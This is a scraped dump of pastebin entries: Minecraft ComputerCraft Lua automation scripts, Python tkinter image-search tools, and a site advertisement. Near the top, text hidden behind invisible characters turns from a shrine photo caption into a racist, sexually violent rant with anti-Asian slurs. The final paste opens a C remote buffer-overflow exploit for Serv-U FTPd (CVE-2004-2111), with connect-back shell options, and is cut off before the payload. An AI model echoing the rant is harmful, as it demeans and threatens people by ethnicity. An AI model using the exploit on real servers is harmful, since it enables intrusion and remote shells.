‎s‎t‎r‎u‎c‎t‎u‎r‎e‎ ‎w‎a‎s‎ ‎b‎u‎i‎l‎t‎ ‎i‎n‎ ‎1‎4‎9‎9‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎s‎h‎o‎w‎s‎ ‎a‎ ‎t‎o‎r‎i‎i‎ ‎p‎a‎t‎h‎ ‎a‎t‎ ‎F‎u‎s‎h‎i‎m‎i‎ ‎I‎n‎a‎r‎i‎-‎t‎a‎i‎s‎h‎a‎ ‎w‎i‎t‎h‎ ‎a‎ ‎h‎a‎n‎g‎i‎n‎g‎ ‎l‎a‎n‎t‎e‎r‎n‎.‎ ‎E‎a‎c‎h‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎h‎r‎i‎n‎e‎'‎s‎ ‎r‎o‎u‎g‎h‎l‎y‎ ‎1‎0‎,‎0‎0‎0‎ ‎t‎o‎r‎i‎i‎ ‎(‎g‎a‎t‎e‎s‎)‎ ‎w‎a‎s‎ ‎d‎o‎n‎a‎t‎e‎d‎ ‎b‎y‎ ‎a‎ ‎J‎a‎p‎a‎n‎e‎s‎e‎ ‎b‎u‎s‎i‎n‎e‎s‎s‎,‎ ‎a‎n‎d‎ ‎a‎p‎p‎r‎o‎x‎i‎m‎a‎t‎e‎l‎y‎ ‎8‎0‎0‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎ ‎a‎r‎e‎ ‎s‎e‎t‎ ‎u‎p‎ ‎i‎n‎ ‎r‎o‎w‎s‎,‎ ‎a‎s‎ ‎d‎e‎p‎i‎c‎t‎e‎d‎ ‎h‎e‎r‎e‎,‎ ‎t‎h‎a‎t‎ ‎g‎i‎v‎e‎ ‎t‎h‎e‎ ‎i‎m‎p‎r‎e‎s‎s‎i‎o‎n‎ ‎o‎f‎ ‎e‎n‎t‎e‎r‎i‎n‎g‎ ‎a‎ ‎t‎u‎n‎n‎e‎l‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎B‎a‎s‎i‎l‎e‎ ‎M‎o‎r‎i‎n‎

.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎ ‎t‎h‎a‎t‎'‎s‎ ‎w‎h‎a‎t‎ ‎y‎o‎u‎ ‎f‎i‎l‎t‎h‎y‎ ‎c‎h‎i‎n‎k‎s‎ ‎g‎e‎t‎ ‎f‎o‎r‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎o‎n‎ ‎m‎y‎ ‎g‎o‎d‎d‎a‎m‎n‎ ‎p‎r‎o‎p‎e‎r‎t‎y‎,‎ ‎y‎o‎u‎ ‎y‎e‎l‎l‎o‎w‎ ‎f‎l‎a‎t‎ ‎f‎a‎c‎e‎d‎ ‎f‎r‎e‎a‎k‎s‎!‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎s‎l‎a‎p‎ ‎a‎l‎l‎ ‎o‎f‎ ‎y‎o‎u‎ ‎w‎i‎t‎h‎ ‎m‎y‎ ‎c‎o‎c‎k‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎p‎i‎s‎s‎ ‎o‎n‎ ‎y‎o‎u‎r‎ ‎f‎a‎c‎e‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎s‎h‎i‎t‎ ‎i‎n‎ ‎y‎o‎u‎r‎ ‎m‎o‎u‎t‎h‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎c‎o‎p‎ ‎o‎f‎f‎ ‎y‎o‎u‎r‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎h‎e‎a‎d‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎f‎u‎c‎k‎ ‎y‎o‎u‎r‎ ‎e‎s‎o‎p‎h‎a‎g‎i‎t‎i‎s‎.‎ ‎"
Q6XD5bkn,Pastes.io - #1 Pastebin Alternative,xxsa,PHP,Friday 15th of March 2024 10:27:00 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Embed, download, print pastes
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Password protected pastes
Encrypted pastes
URL Shortener
Self destroy pastes
Share pastes on social network
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature
Simple Ads by Google Adsense Few rather than Pastebin"
URWjQFXj,Farm Automation,Alexr360,Lua,Friday 15th of March 2024 10:20:19 PM CDT,"while true do
    -- Emit redstone pulse
    redstone.setOutput(""front"", true)
    sleep(1)  -- Keep redstone on for 1 second
    redstone.setOutput(""front"", false)

    -- Set timer for 30 seconds
    local timerID = os.startTimer(30)

    -- Wait for the timer event
    while true do
        local event, timerID = os.pullEvent(""timer"")
        if timerID == timerID then
            break  -- Break the inner loop when the timer event is received
        end
    end
end
"
7grmUeTL,Sorting System 2.0,djgaven588,Lua,Friday 15th of March 2024 10:19:42 PM CDT,"os.loadAPI(""drawLib.lua"")

rednet.close(""right"")
rednet.open(""right"")

local currentState = ""Idle""

local function itemEnchantedOrHighDurability(getItemDetails)
    currentState = ""Checking enchant""
    local itemDetails = getItemDetails()
    if itemDetails.enchantments == nil then
        return itemDetails.durability == nil or itemDetails.durability >= 0.9
    end

    return true
end

local function destroyOverflow()
    return false
end

local itemConditions = {
    [""minecraft:golden_sword""] = {
        keep=itemEnchantedOrHighDurability,
    },
    [""minecraft:cobblestone""] = {
        overflow=destroyOverflow
    }
}

local itemCategories = {
    [""Building""] = {
        ""minecraft:cobblestone"",
        ""minecraft:spruce_planks"",
        ""minecraft:spruce_log""
    },
    [""Functional""] = {
        ""minecraft:chest"",
        ""minecraft:spruce_sign"",
		""computercraft:wired_modem"",
		""computercraft:cable""
    },
    [""Crafting""] = {
        ""minecraft:stick""
    }
}

local craftingRecipes = {
    [""minecraft:chest""] = {
        [1]=""minecraft:spruce_planks"",
        [2]=""minecraft:spruce_planks"",
        [3]=""minecraft:spruce_planks"",
        
        [4]=""minecraft:spruce_planks"",
        [5]=nil,
        [6]=""minecraft:spruce_planks"",
        
        [7]=""minecraft:spruce_planks"",
        [8]=""minecraft:spruce_planks"",
        [9]=""minecraft:spruce_planks"",
        count=1
    },
    [""minecraft:spruce_planks""] = {
        [1]=""minecraft:spruce_log"",
        count=4
    },
	[""minecraft:spruce_sign""] = {
		[1]=""minecraft:spruce_planks"",
		[2]=""minecraft:spruce_planks"",
		[3]=""minecraft:spruce_planks"",
		[4]=""minecraft:spruce_planks"",
		[5]=""minecraft:spruce_planks"",
		[6]=""minecraft:spruce_planks"",
		[8]=""minecraft:stick"",
		count=3
	},
	[""minecraft:stick""] = {
		[1]=""minecraft:spruce_planks"",
		[4]=""minecraft:spruce_planks"",
		count = 4
	},
	[""computercraft:wired_modem""] = {
		[1]=""minecraft:stone"",
		[2]=""minecraft:stone"",
		[3]=""minecraft:stone"",
		[4]=""minecraft:stone"",
		[5]=""minecraft:redstone"",
		[6]=""minecraft:stone"",
		[7]=""minecraft:stone"",
		[8]=""minecraft:stone"",
		[9]=""minecraft:stone"",
		count = 1
	},
	[""computercraft:cable""] = {
		[2]=""minecraft:stone"",
		[4]=""minecraft:stone"",
		[5]=""minecraft:redstone"",
		[6]=""minecraft:stone"",
		[8]=""minecraft:stone"",
		count=6
	}
}

local storageConfigs = {
    [""minecraft:chest_9""] = {
        mode=""supply""
    },
    [""minecraft:chest_10""] = {
        mode=""store"",
        storeMode=""overflow"",
    },
    [""minecraft:chest_11""] = {
        mode=""store"",
        storeMode=""copy"",
    },
    [""minecraft:chest_12""] = {
        mode=""store"",
        storeMode=""destroy""
    },
    [""minecraft:chest_13""] = {
        mode=""provide"",
        provideMode=""exact"",
        requests = {
            [""minecraft:spruce_sign""]=5
        }
    },
    [""turtle_3""] = {
        mode=""crafter"",
        craftChest=""minecraft:chest_16""
    },
	[""minecraft:chest_14""] = {
		mode=""requestOutput""
	},
	[""minecraft:chest_15""] = {
		mode=""working""
	},
	[""turtle_1""] = {
		mode=""crafter"",
		craftChest=""minecraft:chest_17""
	},
	[""minecraft:chest_18""] = {
		mode=""working""
	}
}

local function getItemCondition(name)
    currentState = ""Get item condition""
    for itemName,conditions in pairs(itemConditions) do
        if itemName == name then
            return conditions
        end
    end
	
    return nil
end

local function getItemRecipes(itemName)
    local result = {}
    for item,recipe in pairs(craftingRecipes) do
        if item == itemName then
            table.insert(result, recipe)
        end
    end
    return result
end

local allStores = {}
local function calculateStoreContents(store)
    store.counts = {}
    currentState = ""Calculate store contents""
    for slot, item in pairs(store.peripheral.list()) do
        if item ~= nil then
            if store.counts[item.name] == nil then
                if store.mode == ""copy"" then
                    store.counts[item.name] = item.count - 1
                else
                    store.counts[item.name] = item.count
                end
            else
                store.counts[item.name] = store.counts[item.name] + item.count
            end
        end
    end
    
    return store
end

local function createStore(peripheralName,config)
    currentState = ""Create store""
    local displayName = peripheralName
    if config.displayName ~= nil and string.len(config.displayName) > 0 then
        displayName = config.displayName
    end
    local newStore = {
        displayName = displayName,
        peripheral = peripheral.wrap(peripheralName),
        mode = config.storeMode,
        counts = {}
    }
    newStore.canStoreItem = (function(name)
            if config.storeMode == ""destroy"" then
                return true
            elseif config.storeMode == ""overflow"" then
                return true
            elseif config.storeMode == ""copy"" then
                if newStore.counts[name] ~= nil then
                    return true
                else
                    return false
                end
            end
        end)
    if newStore.peripheral == nil then
        error(""Couldn't find peripheral ""..peripheralName)
    end
    
    newStore = calculateStoreContents(newStore)
    
    allStores[peripheralName] = newStore
end

-- Get all possible stores for itemName
local function getItemStores(itemName)
    local result = {
        stores = {},
        overflows = {},
        destroys = {}
    }
    for storeName, store in pairs(allStores) do
        if store.canStoreItem(itemName) then
            if store.mode == ""copy"" then
                result.stores[storeName] = store
            elseif store.mode == ""overflow"" then
                result.overflows[storeName] = store
            elseif store.mode == ""destroy"" then
                result.destroys[storeName] = store
            end
        end
    end
    
    return result
end

local allSupplies = {}
local function createSupply(peripheralName,config)
    currentState = ""Create Supply""
    local displayName = peripheralName
    if config.displayName ~= nil and string.len(config.displayName) > 0 then
        displayName = config.displayName
    end
    local newSupply = {
        displayName = displayName,
        peripheral = peripheral.wrap(peripheralName)
    }
    if newSupply.peripheral == nil then
        error(""Couldn't find peripheral ""..peripheralName)
    end
    allSupplies[peripheralName] = newSupply
end

local allProvides = {}
local function createProvide(peripheralName, config)
    currentState = ""Create Provide""
    local displayName = peripheralName
    if config.displayName ~= nil and string.len(config.displayName) > 0 then
        displayName = config.displayName
    end
    local newProvide = {
        displayName = displayName,
        peripheral = peripheral.wrap(peripheralName),
        requests = config.requests,
        mode = config.provideMode
    }
    if newProvide.peripheral == nil then
        error(""Couldn't find peripheral ""..peripheralName)
    end
    allProvides[peripheralName] = newProvide
end

local allCrafters = {}
local function createCrafter(peripheralName, config)
    currentState = ""Create crafter""
    local displayName = peripheralName
    if config.displayName ~= nil and string.len(config.displayName) > 0 then
        displayName = config.displayName
    end
    local newCrafter = {
        displayName = displayName,
        peripheral = peripheral.wrap(config.craftChest),
        turtle = peripheral.wrap(peripheralName),
        busy=false,
        crafting=false
    }
    if newCrafter.peripheral == nil then
        error(""Couldn't find peripheral ""..peripheralName)
    end
    if newCrafter.turtle == nil then
        error(""Coudn't find peripheral ""..config.turtle)
    end

	-- Power cycle turtle
	-- This ensures it is clear before we start crafting
	newCrafter.turtle.shutdown()
	os.sleep(0.1)
	newCrafter.turtle.turnOn()

    allCrafters[peripheralName] = newCrafter
end

local allRequestOutputs = {}
local function createRequestOutput(peripheralName, config)
	currentState = ""Create Request Output""
	local displayName = peripheralName
	if config.displayName ~= nil and string.len(config.displayName) > 0 then
		displayName = config.displayName
	end
	local newRequestOutput = {
		displayName = displayName,
		peripheral = peripheral.wrap(peripheralName)
	}
	allRequestOutputs[peripheralName] = newRequestOutput
end

local allWorking = {}
local function createWorking(peripheralName, config)
	currentState = ""Create Working""
	local displayName = peripheralName
	if config.displayName ~= nil and string.len(config.displayName) > 0 then
		displayName = config.displayName
	end
	local newWorking = {
		displayName = displayName,
		peripheral = peripheral.wrap(peripheralName),
		busy=false
	}
	allWorking[peripheralName] = newWorking
end

-- Put the requested item into the destination from
-- the given sources.
-- Returns the amount retrieved
local function requestItemsToDestination(destination, itemName, itemCount, targetSlot)
    local sources = getItemStores(itemName).stores
    local remainingCount = itemCount
    for sourceName, source in pairs(sources) do
        for slot, item in pairs(source.peripheral.list()) do
            if item.name == itemName then
                local maxPushCount = remainingCount
                if source.counts ~= nil and source.counts[itemName] < maxPushCount then
                    maxPushCount = source.counts[itemName]
                end
                local pushCount = source.peripheral.pushItems(peripheral.getName(destination.peripheral), slot, maxPushCount, targetSlot)
                remainingCount = remainingCount - pushCount
                if source.counts ~= nil then
                    source.counts[itemName] = source.counts[itemName] - pushCount
                end
                if remainingCount <= 0 then
                    break
                end
            end
        end
    end
    return itemCount - remainingCount
end

local function sendSlotToDestinations(source,destinations,slot,itemName,count)
    local remainingCount = count
    for destinationName, destination in pairs(destinations) do
        local pushCount = source.peripheral.pushItems(destinationName, slot)
        if source.counts ~= nil then
            source.counts[itemName] = source.counts[itemName] - pushCount
        end
        if destination.counts ~= nil then
            if destination.counts[itemName] == nil then
                destination.counts[itemName] = pushCount
            else
                destination.counts[itemName] = destination.counts[itemName] + pushCount
            end
        end
        remainingCount = remainingCount - pushCount
        if remainingCount <= 0 then
            break
        end
    end
    
    return remainingCount
end

local function transferItems(source, destination, itemName, itemCount)
	if source == nil or destination == nil or itemName == nil or itemCount == nil then
		error(""Transfer items, bad parameters"")
	end
	local remainingCount = itemCount
	for slot, item in pairs(source.peripheral.list()) do
		if item.name == itemName then
			local transferCount = source.peripheral.pushItems(peripheral.getName(destination.peripheral), slot, remainingCount)
			if source.counts ~= nil then
				if source.counts[itemName] ~= nil then
					source.counts[itemName] = source.counts[itemName] - transferCount
				end
			end
			if destination.counts ~= nil then
				if source.counts[itemName] ~= nil then
					source.counts[itemName] = source.counts[itemName] + transferCount
				else
					source.counts[itemName] = transferCount
				end
			end
			remainingCount = remainingCount - transferCount
			if remainingCount <= 0 then
				break
			end
		end
	end

	return remainingCount <= 0
end

local function transferAll(source, destination)
	for slot, item in pairs(source.peripheral.list()) do
			local transferCount = source.peripheral.pushItems(peripheral.getName(destination.peripheral), slot)
			if source.counts ~= nil then
				if source.counts[item.name] ~= nil then
					source.counts[item.name] = source.counts[item.name] - transferCount
				end
			end
			if destination.counts ~= nil then
				if source.counts[item.name] ~= nil then
					source.counts[item.name] = source.counts[item.name] + transferCount
				else
					source.counts[item.name] = transferCount
				end
			end
	end
end

function craftItem(workingChest, itemName, itemCount)
    currentState = ""Crafting item ""..itemName.."" ""..itemCount
    -- Find item recipe
    -- Note: Later this should determine if another
    -- recipe can be used
    local recipes = getItemRecipes(itemName)
    if recipes[1] == nil then
        -- No crafting recipe
        return false
    end
    
    local recipe = recipes[1]
    
    -- Calculate requirements
    local requirements = {}
    for i=1,9,1 do
        local requirement = recipe[i]
        if requirement ~= nil then
            if requirements[requirement] ~= nil then
                requirements[requirement] = 1 + requirements[requirement]
            else
                requirements[requirement] = 1
            end
        end
    end
    
    local craftCount = math.ceil(itemCount / recipe.count)
    -- Get all requirements
    for name,count in pairs(requirements) do
        -- Get enough for total requirement
        requirements[name] = math.ceil(count * craftCount)
        if getOrCraftItem(workingChest, name, requirements[name], false, workingChest) == false then
            return false
        end
    end
    
    -- Find a crafter to craft in
    local crafterName, crafter
    for name,craft in pairs(allCrafters) do
        if craft.busy == false then
            crafterName = name
            crafter = craft
        end
    end
    
    -- Failure detection
    -- Note: We should change the busy check
    -- If we already have at least 1 crafter,
    -- just wait until one is ready.
    if crafter == nil then
        error(""No crafter found! All in use or none"")
    end
    
    -- Mark as busy before send
    -- This ensures it keeps it
    crafter.busy = true

	-- Clear crafting chest
	transferAll(crafter, workingChest)
    
    -- Transfer requirements
    currentState = ""Transfering crafting requirements""
    for requirement, requirementCount in pairs(requirements) do
		print(""Transfer"",requirement,requirementCount)
        if transferItems(workingChest, crafter, requirement, requirementCount) == false then
			error(""Working chest is missing items?!"")
		end
    end
    
    for i=1,craftCount,1 do
        -- Tell crafter to craft
        crafter.crafting = true
        rednet.send(crafter.turtle.getID(), { type=""craft"", message=recipe })
        
        -- Wait for craft to finish
        while crafter.crafting == true do
            currentState = ""Waiting for crafter""
            os.sleep(1/20)
        end
    end

    -- Return results to working chest
    transferAll(crafter, workingChest)

    crafter.busy = false

    return true
end

function getOrCraftItem(destination, itemName, itemCount, clear, workingChest)
	local provideChest;

	if workingChest == nil then
		for _, working in pairs(allWorking) do
			if working.busy == false then
				workingChest = working
				break
			end
		end
	end

	for _, provide in pairs(allProvides) do
		provideChest = provide
		break
	end

	if workingChest == nil or provideChest == nil then
		error(""Missing working or provide chest for get or craft operation"")
	end

	if clear == true then
		workingChest.busy = true
		transferAll(workingChest, provideChest)
	end

    local count = requestItemsToDestination(workingChest, itemName, itemCount)

    -- If we already have enough, bail
    if count >= itemCount then
        transferItems(workingChest, destination, itemName, itemCount)
		workingChest.busy = false
        return true
    end
    -- Try crafting item instead
    if craftItem(workingChest, itemName, itemCount) == true then
        transferItems(workingChest, destination, itemName, itemCount)
		if clear == true then
			transferAll(workingChest, provideChest)
			workingChest.busy = false
		end
        return true
    end

	print(""Failed get or craft"",itemName,itemCount,""returning items"")
	if clear == true then
		transferAll(workingChest, provideChest)
		workingChest.busy = false
	end

    return false
end

local function handleItem(source, slot, itemName, itemCount)
    local itemConditions = getItemCondition(itemName)
    local itemStores = getItemStores(itemName)
    local remainingItems = itemCount
    -- If we don't want to keep this item
    if itemConditions ~= nil and
        itemConditions.keep ~= nil and
        itemConditions.keep(
            (function()
                return source.peripheral.getItemDetail(slot)
            end)) == false then
        -- Find a place to destroy
        remainingItems = sendSlotToDestinations(source, itemStores.destroys, slot, itemName, remainingItems)
        -- If we want to keep this item         
    else
        -- Try and put it away
        remainingItems = sendSlotToDestinations(source, itemStores.stores, slot, itemName, remainingItems)
        -- We have overflow
        if remainingItems > 0 then
            -- Should we throw away overflow
            if itemConditions ~= nil and itemConditions.overflow ~= nil and itemConditions.overflow() == false then
                remainingItems = sendSlotToDestinations(source, itemStores.destroys, slot, itemName, remainingItems)    
                -- Overflow
            else
                remainingItems = sendSlotToDestinations(source, itemStores.overflows, slot, itemName, remainingItems)
                -- Destroy
                if remainingItems > 0 then
                    remainingItems = sendSlotToDestinations(source, itemStores.destroys, slot, itemName, remainingItems)
                end
            end
        end
    end
    return remainingItems
end

local function handleSupplies()
    for supplyName, supply in pairs(allSupplies) do
        local itemsToSort = supply.peripheral.list()
        
        -- Sort each slot of supply inventory
        for slot, item in pairs(itemsToSort) do
            if item ~= nil then
                currentState = ""Putting away ""..item.name.."" ""..item.count
                handleItem(supply, slot, item.name, item.count)
            end
        end
    end
end

local function handleProvides()
    for providerName, provider in pairs(allProvides) do
        local counts = {}
        for slot, item in pairs(provider.peripheral.list()) do
            if counts[item.name] == nil then
                counts[item.name] = item.count
            else
                counts[item.name] = counts[item.name] + item.count
            end
            if provider.mode == ""exact"" then
                if provider.requests[item.name] == nil then
                    handleItem(provider, slot, item.name, item.count)
                elseif provider.requests[item.name] < counts[item.name] then
                    handleItem(provider, slot, item.name, counts[item.name] - provider.requests[item.name])
                end
            end
        end
        for requestName, requestCount in pairs(provider.requests) do
            if counts[requestName] == nil then
                currentState = ""Supplying ""..requestName.."" ""..requestCount.."" to ""..provider.displayName
                requestItemsToDestination(provider, requestName, requestCount)
            elseif counts[requestName] < requestCount then
                currentState = ""Supplying ""..requestName.."" ""..requestCount.."" to ""..provider.displayName
                requestItemsToDestination(provider, requestName, requestCount - counts[requestName])
            end
        end
    end
end

local requests = {}
local function createRequest(itemName, itemCount)
    requests[math.random(1,9999999)] = { name=itemName, count=itemCount }
end

local function clearRequests()
    requests = {}
end

local function handleRequests()
    for i,request in pairs(requests) do
		requests[i] = nil
        currentState = ""Handling request ""..request.name.."" ""..request.count
		local requestOutput
		for name, output in pairs(allRequestOutputs) do
			requestOutput = output
		end

		if requestOutput == nil then
			error(""Need request output to handle request"")
		end

        local success = getOrCraftItem(requestOutput, request.name, request.count, true)
		print(""Request finished"", request.name, request.count, ""success"", success)
        break
    end
end

local function sortLoop()
	local crafterCount = 0
	local workingCount = 0

	for _, crafter in pairs(allCrafters) do
		crafterCount = crafterCount + 1
	end
	for _, working in pairs(allWorking) do
		workingCount = workingCount + 1
	end

	local maxParallelCrafts = math.min(crafterCount, workingCount)

    while true do
        currentState = ""Idle""
        handleSupplies()
		handleProvides()
		if maxParallelCrafts <= 1 then
			handleRequests()
		elseif maxParallelCrafts <= 2 then
			parallel.waitForAll(handleRequests, handleRequests)
		elseif maxParallelCrafts <= 3 then
			parallel.waitForAll(handleRequests, handleRequests, handleRequests)
		end
    end
end

local monitor = peripheral.find(""monitor"")

local currentItemCategory = nil
function uiLoop()
    drawLib.clear()
    
    local cancelQueue = drawLib.createButton(51,2,27,2,""Cancel Queue"",
        (function()
            clearRequests()
            print(""Cleared requests"")
        end),true)
    
    drawLib.addButton(cancelQueue)
    
    local categoryButtons = {}
    local nextCategoryX = 0
    for categoryName,category in pairs(itemCategories) do
        local button = drawLib.createButton(nextCategoryX, 2, string.len(categoryName) + 2, 2, categoryName, nil, true)
        button.action = function()
            currentItemCategory = category
            drawLib.clear()
            drawLib.addButton(cancelQueue)
            for catName,cat in pairs(categoryButtons) do
                drawLib.addButton(cat)
            end
            local itemCount = 1
            for i,item in ipairs(currentItemCategory) do
                local tempButton = drawLib.createButton(25,5+itemCount,0,0,""1"", function()
                    createRequest(item,1)
                end,true)
                itemCount = itemCount+1
                drawLib.addButton(tempButton)
            end
        end
        nextCategoryX = nextCategoryX + string.len(categoryName) + 4
        drawLib.addButton(button)
        categoryButtons[categoryName] = button
    end
    
    monitor.setCursorBlink(false)
    monitor.setTextScale(0.5)
    
    while true do
        monitor.setCursorPos(1,1)
        monitor.setBackgroundColor(colors.black)
        monitor.clear()
        drawLib.render(monitor)
        monitor.setCursorPos(1,1)
        monitor.setBackgroundColor(colors.black)
        monitor.setTextColor(colors.white)
        monitor.write(currentState)
        
        -- Request queue
        monitor.setCursorPos(55,1)
        monitor.write(""Request Queue"")
        local requestCounter = 1
        for i,request in pairs(requests) do
            monitor.setCursorPos(51,requestCounter+5)
            requestCounter = requestCounter + 1
            monitor.write(""[""..i..""] ""..request.name.."" ""..request.count)
        end
        -- Item category display
        if currentItemCategory ~= nil then
            for i,item in ipairs(currentItemCategory) do
                local count = 0
                local stores = getItemStores(item)
                for storeName,store in pairs(stores.stores) do
                    if store.counts[item] then
                        count = count + store.counts[item]
                    end
                end
                monitor.setCursorPos(1,5 + i)
                monitor.write(item.."" ""..count)
            end
        end
        
        -- 10hz update should be fine
        os.sleep(0.1)
    end
end

local function net(id, msg, protocol)
    -- Handle crafter notifications
    -- Used to identify busy crafters
    if msg.type == ""crafter"" then
        for _,crafter in pairs(allCrafters) do
            if crafter.turtle.getID() == id then
                if msg.message == ""craftFinished"" then
                    crafter.crafting = false
                end
            end
        end
    end
end

local function eventLoop()
    while true do
        local event, n, x, y = os.pullEvent()
        if event == ""monitor_touch"" then
            drawLib.onClick(x,y,2)
        elseif event == ""rednet_message"" then
            net(n,x,y)
        end
    end
end

local function initialize()
    currentState = ""Initialize""
	monitor.clear()
	monitor.setCursorPos(1,1)
	monitor.setTextColor(colors.white)
	monitor.setBackgroundColor(colors.black)
	monitor.write(""Initializing... Please wait"")
    allStores = {}
    allSupplies = {}
    allProvides = {}
    allCrafters = {}
    for peripheralName,config in pairs(storageConfigs) do
        if config.mode == ""store"" then
            createStore(peripheralName, config)
        elseif config.mode == ""supply"" then
            createSupply(peripheralName, config)
        elseif config.mode == ""provide"" then
            createProvide(peripheralName, config)
        elseif config.mode == ""crafter"" then
            createCrafter(peripheralName, config)
		elseif config.mode == ""requestOutput"" then
			createRequestOutput(peripheralName, config)
		elseif config.mode == ""working"" then
			createWorking(peripheralName, config)
		end
    end

	-- Ensure all systems are initialized and stable!
	-- Primarily for crafters
	os.sleep(6)

	parallel.waitForAny(sortLoop, uiLoop, eventLoop)
end

initialize()"
fAu7QSV0,SEARCH-PICTURES2.py,Najeebsk,Python,Friday 15th of March 2024 09:31:55 PM CDT,"import tkinter as tk
from tkinter import ttk
import webbrowser

class ImageSearchApp:
    def __init__(self, root):
        self.root = root
        self.root.title(""Image Search App"")
        
        self.search_label = ttk.Label(root, text=""Enter image URL:"")
        self.search_label.pack(pady=5)
        
        self.search_entry = ttk.Entry(root, width=30)
        self.search_entry.pack(pady=5)
        
        self.search_button_google = ttk.Button(root, text=""Search (Google)"", command=self.search_images_google)
        self.search_button_google.pack(pady=5)
        
        self.search_button_bing = ttk.Button(root, text=""Search (Bing)"", command=self.search_images_bing)
        self.search_button_bing.pack(pady=5)
        
        self.search_button_tineye = ttk.Button(root, text=""Search (TinEye)"", command=self.search_images_tineye)
        self.search_button_tineye.pack(pady=5)
        
        self.result_text = tk.Text(root, wrap=""word"", width=50, height=10)
        self.result_text.pack(pady=5)
        
    def search_images_google(self):
        query = self.search_entry.get()
        if query:
            url = f""https://www.google.com/searchbyimage?image_url={query}""
            webbrowser.open_new_tab(url)
        else:
            self.result_text.insert(tk.END, ""Please enter an image URL."")
    
    def search_images_bing(self):
        query = self.search_entry.get()
        if query:
            url = f""https://www.bing.com/images/searchbyimage?url={query}""
            webbrowser.open_new_tab(url)
        else:
            self.result_text.insert(tk.END, ""Please enter an image URL."")
    
    def search_images_tineye(self):
        query = self.search_entry.get()
        if query:
            url = f""https://www.tineye.com/search/?url={query}""
            webbrowser.open_new_tab(url)
        else:
            self.result_text.insert(tk.END, ""Please enter an image URL."")

if __name__ == ""__main__"":
    root = tk.Tk()
    app = ImageSearchApp(root)
    root.mainloop()
"
SqQRg9CU,SEARCH-PICTURES.py,Najeebsk,Python,Friday 15th of March 2024 09:30:41 PM CDT,"import tkinter as tk
from tkinter import messagebox
import subprocess

def download_image():
    keyword = keyword_entry.get()
    savedir = savedir_entry.get()
    target = target_var.get()
    limits = limits_scale.get()
    nthreadings = nthreadings_scale.get()

    # Constructing the command to execute
    command = [""imagedl""]
    if keyword:
        command.extend([""-k"", keyword])
    if savedir:
        command.extend([""-s"", savedir])
    if target:
        command.extend([""-t"", target])
    if limits:
        command.extend([""-l"", str(limits)])
    if nthreadings:
        command.extend([""-n"", str(nthreadings)])

    # Executing the command
    try:
        subprocess.run(command, check=True)
        messagebox.showinfo(""Download Successful"", ""Images downloaded successfully!"")
    except subprocess.CalledProcessError:
        messagebox.showerror(""Download Error"", ""An error occurred while downloading images."")

# Create the main window
root = tk.Tk()
root.title(""Image Downloader"")

# Create input fields and labels
keyword_label = tk.Label(root, text=""Keyword:"")
keyword_label.grid(row=0, column=0, padx=10, pady=5)
keyword_entry = tk.Entry(root, width=50)
keyword_entry.grid(row=0, column=1, padx=10, pady=5)

savedir_label = tk.Label(root, text=""Save Directory:"")
savedir_label.grid(row=1, column=0, padx=10, pady=5)
savedir_entry = tk.Entry(root, width=50)
savedir_entry.grid(row=1, column=1, padx=10, pady=5)

target_label = tk.Label(root, text=""Target:"")
target_label.grid(row=2, column=0, padx=10, pady=5)
targets = [""google"", ""baidu"", ""bing""]
target_var = tk.StringVar(root)
target_var.set(targets[0])  # Default value
target_dropdown = tk.OptionMenu(root, target_var, *targets)
target_dropdown.grid(row=2, column=1, padx=10, pady=5)

limits_label = tk.Label(root, text=""Limits:"")
limits_label.grid(row=3, column=0, padx=10, pady=5)
limits_scale = tk.Scale(root, from_=10, to=1000, orient=""horizontal"")
limits_scale.grid(row=3, column=1, padx=10, pady=5)

nthreadings_label = tk.Label(root, text=""Number of Threadings:"")
nthreadings_label.grid(row=4, column=0, padx=10, pady=5)
nthreadings_scale = tk.Scale(root, from_=0, to=30, orient=""horizontal"", tickinterval=5, showvalue=True)
nthreadings_scale.grid(row=4, column=1, padx=10, pady=5)

# Create download button
download_button = tk.Button(root, text=""Download"", command=download_image)
download_button.grid(row=5, columnspan=2, padx=10, pady=5)

# Run the GUI
root.mainloop()
"
sRVN0u5x,RhinoSoft Serv-U FTPd Server 3.x/4.x - 'SITE CHMOD' Remote Overflow - CVE-2004-2111,FlyFar,C,Friday 15th of March 2024 09:23:30 PM CDT,"/*
*-----------------------------------------------------------------------
* 
* Servu.c - Serv-U FTPD 3.x/4.x ""SITE CHMOD"" Command
* Remote stack buffer overflow exploit
*
* Copyright (C) 2004 HUC All Rights Reserved.
*
* Author   : lion
*          : lion@cnhonker.net
*          : http://www.cnhonker.com
* Date     : 2004-01-25
*          : 2004-01-25 v1.0 Can attack Serv-U v3.0.0.20~v4.1.0.11
* Tested   : Windows 2000 Server EN/GB
*          :	 + Serv-U v3.0.0.20~v4.1.0.11
* Notice   : *** Bug find by kkqq kkqq@0x557.org ***
*          : *** You need a valid account and a writable directory. ***
* Complie  : cl Servu.c
* Usage	   : Servu <-i ip> <-t type> [-u user] [-p pass] [-d dir] [-f ftpport] [-c cbhost] [-s shellport]
*------------------------------------------------------------------------
*/

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, ""ws2_32"")

// for bind shellcode
#define BIND_OFFSET		91

// for connectback shellcode
